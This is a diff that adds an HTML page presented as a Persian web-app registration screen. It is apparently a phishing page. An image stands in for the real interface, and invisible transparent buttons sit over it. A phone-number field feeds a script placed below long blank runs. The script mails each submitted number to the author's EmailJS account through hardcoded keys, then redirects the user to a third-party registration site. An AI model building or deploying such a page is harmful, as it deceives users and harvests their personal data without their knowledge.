@@ -1,0 +1,188 @@
+<head>
+
+<meta charset="UTF-8">  
+  
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>  
+  
+  
+<title>ثبت‌نام در وب اپلیکیشن</title>
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<body>
+  
+
+<img src="u1a.png"
+style="
+margin-top: -9px;
+">  
+  
+
+
+
+
+<form id="form">
+
+
+
+<div 
+style="
+position:relative
+">
+
+
+
+
+<img src="how.png">
+
+
+
+
+<input 
+name="name"
+type="number"
+placeholder="09xxxxxxxxx"
+required
+style="
+border:none;
+outline:none;
+position: absolute;
+left: 18.5%;
+top: 863px;
+width: 75%;
+font-size: 330%;
+">
+
+
+
+
+  <button
+  type="submit"
+  style="
+  position:absolute;
+  top:67.5%;
+  left:16%;
+  font-size:500%;
+  width:80%;
+  background: transparent;
+  border: none;
+  color: transparent;
+ ">link</button>
+
+
+</div>
+
+
+  
+  
+</form>
+  
+  
+  
+  
+<button
+onclick="window.location.href=''"
+style="
+position:absolute;
+  top: 1480px;
+  left: 300px;
+  font-size: 400%;
+  width: 500px;
+  background: transparent;
+  border: none;
+  color: transparent; 
+">link</button>
+  
+  
+  
+  
+  
+  
+</body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+
+emailjs.init("H3PsRLpwrVTHKG3ww");
+
+document.getElementById("form").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  emailjs.sendForm(
+    "service_z4wahxm",
+    "template_gnyhsze",
+    this
+  ).then(function() {
+    window.location.href = "https://persiannumber.ir/app/register";
+  }).catch(function(error) {
+    console.log(error);
+  });
+
+});
+
+</script>
+
+
+
